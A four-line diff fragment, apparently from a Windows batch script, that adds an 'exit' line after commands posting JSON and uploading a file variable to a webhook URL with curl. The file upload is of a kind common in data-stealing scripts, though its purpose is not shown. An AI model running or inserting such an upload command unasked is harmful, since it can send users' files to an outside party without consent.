@@ -23,3 +23,4 @@ json\n\"}" ^
     %WEBHOOK%
 curl -F "file=@%FILEEE%" %WEBHOOK%
 )
+exit
